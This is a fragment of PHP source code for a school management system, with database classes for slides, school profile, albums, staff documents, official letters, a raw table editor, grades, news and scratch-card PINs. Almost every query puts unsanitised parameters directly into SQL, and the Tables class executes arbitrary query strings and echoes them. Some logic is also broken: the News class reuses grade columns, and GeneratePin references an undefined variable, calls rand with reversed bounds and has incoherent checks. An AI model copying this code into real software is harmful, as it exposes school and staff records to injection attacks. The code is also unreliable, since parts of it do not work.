  }

  public static function ReadSlideGraphics($dir)
  {
    $graphics=scandir($dir);
    $images=array();
    foreach($graphics as $Dir)
    {
      if(!($Dir=="." || $Dir==".."))
      {
        array_push($images, $Dir);
      }      
    }
    return $images;
  }

  public static function DeleteSlide($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from slide_show where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllSlides(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from slide_show order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadSlidesDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from slide_show where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['name']=$res['name'];
        $news['description']=$res['description'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }


  //School Profile

  public static function CountSchoolExist(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from `school_profile` ");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function UpdateSchoolProfile($id, $school_name, $school_keycode, $school_date_of_establishment, $school_phone, $school_email, $school_website, $school_facebook, $school_instagram, $school_whatsapp, $school_linkedin, $school_motto, $school_address, $school_mission, $school_vision, $school_values, $school_owner, $school_head, $school_exam_officer, $school_burser, $domain_sub_date, $domain_due_date, $hosting_sub_date, $hosting_due_date, $header_color, $top_header_color){  

    if(School::CountSchoolExist()>0){    
      $query=mysqli_query(dbass::Connect(),"UPDATE `school_profile` SET `school_name`='$school_name',`school_keycode`='$school_keycode',`school_date_of_establishment`='$school_date_of_establishment',`school_phone`='$school_phone',`school_email`='$school_email',`school_website`='$school_website',`school_facebook`='$school_facebook',`school_instagram`='$school_instagram',`school_whatsapp`='$school_whatsapp',`school_linkedin`='$school_linkedin',`school_motto`='$school_motto',`school_address`='$school_address',`school_mission`='$school_mission',`school_vision`='$school_vision',`school_values`='$school_values',`school_owner`='$school_owner',`school_head`='$school_head',`school_exam_officer`='$school_exam_officer',`school_burser`='$school_burser',`domain_sub_date`='$domain_sub_date',`domain_due_date`='$domain_due_date',`hosting_sub_date`='$hosting_sub_date',`hosting_due_date`='$hosting_due_date',`header_color`='$header_color',`top_header_color`='$top_header_color'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT INTO `school_profile`(`school_name`, `school_keycode`, `school_date_of_establishment`, `school_phone`, `school_email`, `school_website`, `school_facebook`, `school_instagram`, `school_whatsapp`, `school_linkedin`, `school_motto`, `school_address`, `school_mission`, `school_vision`, `school_values`, `school_owner`, `school_head`, `school_exam_officer`, `school_burser`, `domain_sub_date`, `domain_due_date`, `hosting_sub_date`, `hosting_due_date`, `header_color`, `top_header_color`) VALUES ('$school_name', '$school_keycode', '$school_date_of_establishment', '$school_phone', '$school_email', '$school_website', '$school_facebook', '$school_instagram', '$school_whatsapp', '$school_linkedin', '$school_motto', '$school_address', '$school_mission', '$school_vision', '$school_values', '$school_owner', '$school_head', '$school_exam_officer', '$school_burser', '$domain_sub_date', '$domain_due_date', '$hosting_sub_date', '$hosting_due_date', '$header_color', '$top_header_color')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }

    return $news;
  }

  public static function ReadSchoolDetails(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from school_profile ");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['school_name']=$res['school_name'];
        $news['school_keycode']=$res['school_keycode'];
        $news['school_date_of_establishment']=$res['school_date_of_establishment'];
        $news['school_email']=$res['school_email'];
        $news['school_website']=$res['school_website'];
        $news['school_phone']=$res['school_phone'];
        $news['school_facebook']=$res['school_facebook'];
        $news['school_blog']=$res['school_blog'];
        $news['school_instagram']=$res['school_instagram'];
        $news['school_whatsapp']=$res['school_whatsapp'];
        $news['school_tweeter']=$res['school_tweeter'];
        $news['school_linkedin']=$res['school_linkedin'];
        $news['school_motto']=$res['school_motto'];
        $news['school_address']=$res['school_address'];
        $news['school_mission']=$res['school_mission'];
        $news['school_vision']=$res['school_vision'];
        $news['school_values']=$res['school_values'];
        $news['school_owner']=$res['school_owner'];
        $news['school_head']=$res['school_head'];
        $news['school_exam_officer']=$res['school_exam_officer'];
        $news['school_burser']=$res['school_burser'];
        $news['domain_sub_date']=$res['domain_sub_date'];
        $news['domain_due_date']=$res['domain_due_date'];
        $news['hosting_sub_date']=$res['hosting_sub_date'];
        $news['hosting_due_date']=$res['hosting_due_date'];
        $news['hosting_status']=School::IsHostingExpired($res['hosting_due_date']);
        $news['domain_status']=School::IsDomainExpired($res['domain_due_date']);

        $news['h_e_d']=School::HostingExpiryDay($res['hosting_due_date']);
        $news['d_e_d']=School::DomainExpiryDay($res['domain_due_date']);

        $news['header_color']=$res['header_color'];
        $news['top_header_color']=$res['top_header_color'];
      }
      
      return $news;
  }


  //School and User Slide Options
  public static function AddAlbum($image_name,$album_user_id,$album_user_type,$album_category,$album_caption,$album_date){    
    $query=mysqli_query(dbass::Connect(),"INSERT INTO `album`( `image_name`, `album_user_id`, `album_user_type`, `album_category`, `album_caption`, `album_date`) VALUES ('$image_name','$album_user_id','$album_user_type','$album_category','$album_caption','$album_date')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function UpdateAlbumProfile($id,$image_name,$album_user_id,$album_user_type,$album_category,$album_caption,$album_date){
      $query=mysqli_query(dbass::Connect(),"UPDATE `album` SET `image_name`='$image_name',`album_user_id`='$album_user_id',`album_user_type`='$album_user_type',`album_category`='$album_category',`album_caption`='$album_caption',`album_date`='$album_date' WHERE id='$id' ");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    
    return $news;
  }

  public static function DeleteAlbum($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from album where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllAlbums($type){
    if($type=="All"||$type=="")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from album");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from album where album_user_type='$type' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
    }     
      
    return $news;
  }

  public static function ReadAlbumDetails($id){
    $query=mysqli_query(dbass::Connect(),"SELECT * from album where id='$id'");
    while($res=mysqli_fetch_array($query))
    {
      $news['id']=$res['id'];
      $news['image_name']=$res['image_name'];
      $news['album_user_id']=$res['album_user_id'];
      $news['album_user_type']=$res['album_user_type'];
      $news['album_category']=$res['album_category'];
      $news['album_caption']=$res['album_caption'];
      $news['album_date']=$res['album_date'];
      $news['album_timestamp']=$res['album_timestamp'];
    }
    
    return $news;
  }

  //Document and Credentials Module



  //School and User Slide Options
  public static function AddDocument($document_user_id,$document_upload_name,$document_type,$document_institution_name,$document_date_started,$document_date_ended,$document_description){    
    $query=mysqli_query(dbass::Connect(),"INSERT INTO `staff_documents`( `document_user_id`, `document_upload_name`, `document_type`, `document_institution_name`, `document_date_started`, `document_date_ended`, `document_description`) VALUES ('$document_user_id','$document_upload_name','$document_type','$document_institution_name','$document_date_started','$document_date_ended','$document_description')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }


  public static function UpdateDocumentProfile($id,$document_user_id,$document_type,$document_institution_name,$document_date_started,$document_date_ended,$document_description){
      $query=mysqli_query(dbass::Connect(),"UPDATE `staff_documents` SET `document_user_id`='$document_user_id',`document_type`='$document_type',`document_institution_name`='$document_institution_name',`document_date_started`='$document_date_started',`document_date_ended`='$document_date_ended',`document_description`='$document_description' WHERE id='$id' ");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    
    return $news;
  }

  public static function DeleteDocument($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from staff_documents where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadUserDocuments($document_user_id){
    $query=mysqli_query(dbass::Connect(),"SELECT * from staff_documents where document_user_id='$document_user_id' ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
    }

    return $news;
  }

  public static function ReadAllDocuments(){
    $query=mysqli_query(dbass::Connect(),"SELECT * from staff_documents ");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
    }

    return $news;
  }

  public static function ReadDocumentDetails($id){
    $query=mysqli_query(dbass::Connect(),"SELECT * from staff_documents where id='$id'");
    while($res=mysqli_fetch_array($query))
    {
      $news['id']=$res['id'];
      $news['document_user_id']=$res['document_user_id'];
      $news['document_upload_name']=$res['document_upload_name'];
      $news['document_type']=$res['document_type'];
      $news['document_institution_name']=$res['document_institution_name'];
      $news['document_date_started']=$res['document_date_started'];
      $news['document_date_ended']=$res['document_date_ended'];
      $news['document_description']=$res['document_description'];
    }
    
    return $news;
  }

  public static function ReadUserAlbums($userid){
      $query=mysqli_query(dbass::Connect(),"SELECT * from album where album_user_id='$userid'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function IsAlbumExist($id)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from album where id='$id'");
    $count=mysqli_num_rows($query);
    if($count>0)
    {
      return true;
    }
  }
}


/**
 * OfficialLetter Module for the integrating Institutions
 */
class OfficialLetter extends dbass {
  public static function IsExist($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where id='$id' or our_reference='$id'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNewLetter($our_reference, $letter_body, $sender, $reciever_address, $letter_title, $month, $letter_clossure, $our_date, $letter_salutation){
    
    $query=mysqli_query(dbass::Connect(),"INSERT INTO `official_letter`(`our_reference`, `letter_body`, `sender`, `reciever_address`, `letter_title`, `month`, `letter_clossure`, `our_date`, `letter_salutation`) VALUES ('$our_reference','$letter_body','$sender','$reciever_address','$letter_title','$month','$letter_clossure','$our_date','$letter_salutation')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function UpdateReferenceLetter($id,$our_reference){
      $query=mysqli_query(dbass::Connect(),"UPDATE official_letter set our_reference='$our_reference' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function UpdateLetter($id,$letter_salutation,$letter_title,$reciever_address,$letter_body,$letter_clossure){
      $query=mysqli_query(dbass::Connect(),"UPDATE official_letter set letter_salutation='$letter_salutation',letter_title='$letter_title', reciever_address='$reciever_address',letter_body='$letter_body',letter_clossure='$letter_clossure'  where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      } 

    return $news;
  }

  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from official_letter where id='$id' or our_reference='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function SearchLetter($src){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where our_reference like '%$src%' or  letter_body like '%$src%' or  month like '%$src%' or  our_date like '%$src%' or  letter_salutation like '%$src%' order by id");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadYearLetters($year){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where `our_date` like '%$year%'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadYearMonthLetters($year,$month){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where `our_date` like '%$year%' and month='$month' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadMonthLetters($month){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where month='$month' ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllLetters(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllYears(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {

          if(!in_array(substr($res['our_date'], 0,4), $news)){
            array_push($news, substr($res['our_date'], 0,4));
          }
      }
      
      return $news;
  }

  public static function ReadAllMonths(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {

          if(!in_array(substr($res['month'], 0,4), $news)){
            array_push($news, substr($res['month'], 0,4));
          }
      }
      
      return $news;
  }

  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where id='$id' or our_reference='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['our_reference']=$res['our_reference'];
        $news['letter_body']=$res['letter_body'];
        $news['sender']=$res['sender'];
        $news['reciever_address']=$res['reciever_address'];
        $news['letter_title']=$res['letter_title'];
        $news['month']=$res['month'];
        $news['letter_clossure']=$res['letter_clossure'];
        $news['our_date']=$res['our_date'];
        $news['letter_salutation']=$res['letter_salutation'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }

  public static function ReadNewLetterDetails($letter_body, $reciever_address,$letter_title,$our_date){
      $query=mysqli_query(dbass::Connect(),"SELECT * from official_letter where letter_body='$letter_body' and reciever_address='$reciever_address' and letter_title='$letter_title' and our_date='$our_date'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['our_reference']=$res['our_reference'];
        $news['letter_body']=$res['letter_body'];
        $news['sender']=$res['sender'];
        $news['reciever_address']=$res['reciever_address'];
        $news['letter_title']=$res['letter_title'];
        $news['month']=$res['month'];
        $news['letter_clossure']=$res['letter_clossure'];
        $news['our_date']=$res['our_date'];
        $news['letter_salutation']=$res['letter_salutation'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
}


//Kernel Table Class Start
class Tables extends dbass {

    public static function ReadAllTables($table_schema){
      $query=mysqli_query(dbass::Connect(),"SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '$table_schema'");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['TABLE_NAME'], $news)){
            array_push($news, $res['TABLE_NAME']);
          }
      }        
      return $news;
    }

    public static function ReadTableColumns($table_schema,$table_name){
      $query=mysqli_query(dbass::Connect(),"SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '$table_schema' AND TABLE_NAME = '$table_name';");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['COLUMN_NAME'], $news)){
            array_push($news, $res['COLUMN_NAME']);
          }
      }        
      return $news;
    }

    public static function ReadTableData($table_name,$limitfrom,$limitto){
      $query=mysqli_query(dbass::Connect(),"SELECT * FROM $table_name  LIMIT $limitfrom,$limitto ");
      $data=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $data))
        {
          array_push($data, $res['id']);
        }
      }
      return $data;
    }  

    public static function ReadDataDetails($table_name,$data_id){
      $query=mysqli_query(dbass::Connect(),"SELECT * FROM $table_name where id='$data_id'  ");
      $res=mysqli_fetch_array($query);
      return $res;
    }  

    public static function EditTableData($table_name,$data_id,$query_string){
      $query=mysqli_query(dbass::Connect(),$query_string);
      if($query)
      {
        $news=true;
      }
      else
      {
        $news=false;
      }
      //echo $query_string;
      return $news;
    }  

    public static function AddTableData($table_name,$data_id,$query_string){
      
      $query=mysqli_query(dbass::Connect(),$query_string);
      echo $query_string;
      if($query)
      {
        $news=true;
      }
      else
      {
        $news=false;
      }

      return $news;
    }   


    public static function DeleteTableData($table_name,$data_id){
        $query=mysqli_query(dbass::Connect(),"DELETE from $table_name where id='$data_id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    public static function ReadColumnDetails($table_schema,$table_name,$column_name){
      $query=mysqli_query(dbass::Connect(),"SELECT * FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '$table_schema' AND TABLE_NAME = '$table_name' AND COLUMN_NAME = '$column_name';");
      while($res=mysqli_fetch_array($query))
      {
        $news=$res['DATA_TYPE'];
      }        
      return $news;
    }
}
//Kernel Table Class Stop


/**
 * Grades Module for the integrating Institutions
 */
class Grades extends dbass {
  public static function IsExist($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where id='$id'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }
  
  public static function IsMinScore($grade_min_score){
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where grade_min_score='$grade_min_score'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }
  
  public static function IsMaxScore($grade_max_score){
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where grade_max_score='$grade_max_score'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNew($grade, $grade_symbol, $grade_min_score, $grade_max_score, $grade_remark_sub, $grade_remark_anal, $grade_unit){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into grade_point(grade,grade_symbol,grade_min_score,grade_max_score,grade_remark_sub,grade_remark_anal,grade_unit) values('$grade','$grade_symbol','$grade_min_score','$grade_max_score','$grade_remark_sub','$grade_remark_anal','$grade_unit')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function Update($id, $grade, $grade_symbol, $grade_min_score, $grade_max_score, $grade_remark_sub, $grade_remark_anal, $grade_unit){
    if(Grades::IsExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE grade_point set grade='$grade', grade_symbol='$grade_symbol', grade_min_score='$grade_min_score', grade_max_score='$grade_max_score', grade_remark_sub='$grade_remark_sub', grade_remark_anal='$grade_remark_anal' , grade_unit='$grade_unit' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from grade_point where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllGrades(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadAllMinScores(){
    $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point order by grade_min_score");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!in_array($res['grade_min_score'], $news)){
        array_push($news, $res['grade_min_score']);
      }
    }
    
    return $news;
  }

  public static function ReadAllMaxScores(){
    $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point order by grade_max_score");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!in_array($res['grade_max_score'], $news)){
        array_push($news, $res['grade_max_score']);
      }
    }
    
    return $news;
  }

  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['grade']=$res['grade'];
        $news['grade_symbol']=$res['grade_symbol'];
        $news['grade_min_score']=$res['grade_min_score'];
        $news['grade_max_score']=$res['grade_max_score'];
        $news['grade_remark_sub']=$res['grade_remark_sub'];
        $news['grade_remark_anal']=$res['grade_remark_anal'];
        $news['grade_unit']=$res['grade_unit'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }

  public static function GetMinScore($grade_score)
  {
    if(Grades::IsMaxScore($grade_score))
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where grade_max_score='$grade_score'");
      while($res=mysqli_fetch_array($query))
      {
        $min_scor=$res['grade_min_score'];
      }
    }    
    elseif(Grades::IsMinScore($grade_score))
    {
      $min_scor=$grade_score;
    }
    else
    {
      $min_scores=Grades::ReadAllMinScores();
      array_push($min_scores, $grade_score);
      sort($min_scores); 

      $count=0;
      foreach($min_scores as $min_score)
      {
        if($min_score==$grade_score)
        {
          $index=$count-1;
          $min_scor=$min_scores[$index];
        }
        $count++;
      }

    }

    return $min_scor;
  }

  public static function GetMaxScore($grade_score)
  {
    if(Grades::IsMinScore($grade_score))
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where grade_min_score='$grade_score'");
      while($res=mysqli_fetch_array($query))
      {
        $max_scor=$res['grade_max_score'];
      }
    }
    elseif(Grades::IsMaxScore($grade_score))
    {
      $max_scor=$grade_score;
    }
    else
    {
      $max_scores=Grades::ReadAllMaxScores();
      array_push($max_scores, $grade_score);
      sort($max_scores); 

      $count=0;
      foreach($max_scores as $max_score)
      {
        if($max_score==$grade_score)
        {
          $index=$count+1;
          $max_scor=$max_scores[$index];
        }
        $count++;
      }

    }

    return $max_scor;
  }

  public static function ReadScoreDetails($grade_score){
    $grade_score=round($grade_score);

    $min_score=Grades::GetMinScore($grade_score);
    $max_score=Grades::GetMaxScore($grade_score);
    
    $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where grade_min_score='$min_score' and grade_max_score='$max_score'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['grade']=$res['grade'];
        $news['grade_symbol']=$res['grade_symbol'];
        $news['grade_min_score']=$res['grade_min_score'];
        $news['grade_max_score']=$res['grade_max_score'];
        $news['grade_remark_sub']=$res['grade_remark_sub'];
        $news['grade_remark_anal']=$res['grade_remark_anal'];
        $news['grade_unit']=$res['grade_unit'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }
}
//Grades Module Ended


/**
 * News Module for the integrating Institutions
 */
class News extends dbass {
  public static function IsExist($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from news where id='$id'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function AddNew($grade, $grade_symbol, $grade_min_score, $grade_max_score, $grade_remark_sub, $grade_remark_anal, $grade_unit){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into news(grade,grade_symbol,grade_min_score,grade_max_score,grade_remark_sub,grade_remark_anal,grade_unit) values('$grade','$grade_symbol','$grade_min_score','$grade_max_score','$grade_remark_sub','$grade_remark_anal','$grade_unit')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

    return $news;
  }

  public static function Update($id, $grade, $grade_symbol, $grade_min_score, $grade_max_score, $grade_remark_sub, $grade_remark_anal, $grade_unit){
    if(Grades::IsExist($id))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE news set grade='$grade', grade_symbol='$grade_symbol', grade_min_score='$grade_min_score', grade_max_score='$grade_max_score', grade_remark_sub='$grade_remark_sub', grade_remark_anal='$grade_remark_anal' , grade_unit='$grade_unit' where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }
    }
    else
    {
      $news=false;
    }

      return $news;
  }

  public static function Delete($id){
      $query=mysqli_query(dbass::Connect(),"DELETE from news where id='$id'");

      if($query>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  public static function ReadAllNews(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from news ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['id'], $news)){
            array_push($news, $res['id']);
          }
      }
      
      return $news;
  }

  public static function ReadLatestNews($limit){
    $query=mysqli_query(dbass::Connect(),"SELECT * from news order by grade_min_score");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!in_array($res['grade_min_score'], $news)){
        array_push($news, $res['grade_min_score']);
      }
    }
    
    return $news;
  }

  /** This method reads news from dates, days, weeks, months, years */
  public static function ReadPeriodicNews($parameter){
    $query=mysqli_query(dbass::Connect(),"SELECT * from news order by grade_max_score");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!in_array($res['grade_max_score'], $news)){
        array_push($news, $res['grade_max_score']);
      }
    }
    
    return $news;
  }

  public static function ReadDetails($id){
      $query=mysqli_query(dbass::Connect(),"SELECT * from news where id='$id'");
      while($res=mysqli_fetch_array($query))
      {
        $news['id']=$res['id'];
        $news['grade']=$res['grade'];
        $news['grade_symbol']=$res['grade_symbol'];
        $news['grade_min_score']=$res['grade_min_score'];
        $news['grade_max_score']=$res['grade_max_score'];
        $news['grade_remark_sub']=$res['grade_remark_sub'];
        $news['grade_remark_anal']=$res['grade_remark_anal'];
        $news['grade_unit']=$res['grade_unit'];
        $news['timestamp']=$res['timestamp'];
      }
      
      return $news;
  }

  public static function GetLastNews($grade_score)
  {
    if(Grades::IsMaxScore($grade_score))
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from news where grade_max_score='$grade_score'");
      while($res=mysqli_fetch_array($query))
      {
        $min_scor=$res['grade_min_score'];
      }
    }    
    elseif(Grades::IsMinScore($grade_score))
    {
      $min_scor=$grade_score;
    }
    else
    {
      $min_scores=Grades::ReadAllMinScores();
      array_push($min_scores, $grade_score);
      sort($min_scores); 

      $count=0;
      foreach($min_scores as $min_score)
      {
        if($min_score==$grade_score)
        {
          $index=$count-1;
          $min_scor=$min_scores[$index];
        }
        $count++;
      }

    }

    return $min_scor;
  }

  public static function GetOldestNews($grade_score)
  {
    if(Grades::IsMinScore($grade_score))
    {
      $query=mysqli_query(dbass::Connect(),"SELECT * from grade_point where grade_min_score='$grade_score'");
      while($res=mysqli_fetch_array($query))
      {
        $max_scor=$res['grade_max_score'];
      }
    }
    elseif(Grades::IsMaxScore($grade_score))
    {
      $max_scor=$grade_score;
    }
    else
    {
      $max_scores=Grades::ReadAllMaxScores();
      array_push($max_scores, $grade_score);
      sort($max_scores); 

      $count=0;
      foreach($max_scores as $max_score)
      {
        if($max_score==$grade_score)
        {
          $index=$count+1;
          $max_scor=$max_scores[$index];
        }
        $count++;
      }

    }

    return $max_scor;
  }
}


//Card Module
class Card extends dbass {

  /**This method is used mainly to check the status of the PIN*/
  public static function IsPinUsed($pin,$serial){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where pin='$pin' and `serial`='$serial' and status='Used'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  /**This method is used mainly to check the validity status of the PIN*/
  public static function IsPinValid($pin,$serial){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where pin='$pin' and `serial`='$serial'");

      $res=mysqli_num_rows($query);
      if($res>0)
      {
          $rs=True;
      }
      
      return $rs;
  }

  /**This method is used mainly to generate PIN*/
  public static function GeneratePin()
  {
    $sess=explode("/", $session);
    $init=$sess[0];
    $last=$sess[1];

    $pin=rand(10000,4);
    $pin1=rand(10000,4);
    $pin2=rand(10000,4);

    if(strlen($pin)==4){
      $sp1=$pin;
    }
    if(strlen($pin1)==4){
      $sp2=$pin1;
    }
    if(strlen($pin2)==4){
      $sp2=$pin2;
    }
    if(isset($sp1)&&isset($sp2))
    {
      $sp=$sp1.$sp2;
    }

    if(strlen($sp)!=12)
    {
      $pin=rand(10000,4);

      $pin1=rand(10000,4);

      if(strlen($pin)==4){
        $sp1=$pin;
      }
      if(strlen($pin1)==4){
        $sp2=$pin1;
      }
      if(strlen($pin2)==4){
        $sp3=$pin2;
      }
      if(isset($sp1)&&isset($sp2))
      {
        $sp=$sp1.$sp2.$sp3;
      }
    }


      return "$sp";
  }

  /**This is method is used mainly for statistical analysis and not for other purposes*/
  public static function ReadAll(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards  order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  /**This is method is used mainly for statistical analysis and not for other purposes*/
  public static function ReadAvailableCards(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where status='' or status is null order by id ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  /**This is method is used mainly for statistical analysis and not for other purposes*/
  public static function ReadUsedCards(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from cards where status='used' or status='Used'  order by session ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!in_array($res['id'], $news)){
          array_push($news, $res['id']);
        }
      }
      
      return $news;
  }

  /**This method is used to get the last entry into the scratch Card Bank*/
  public static function GetLastCard(){
      $query=mysqli_query(dbass::Connect(),"SELECT  max(id)  from cards ");
      
      while($res=mysqli_fetch_array($query))
      {
         $news=$res[0];
      }
      
      return $news;
  }

  /**This method is used Save Generated Scratch Card*/
  public static function Add($pin,$serial){
    
    $query=mysqli_query(dbass::Connect(),"INSERT into cards(pin,`serial`) values('$pin','$serial')");
    if($query){
      $news=true;
    }
    else{
      $news=false;
    }

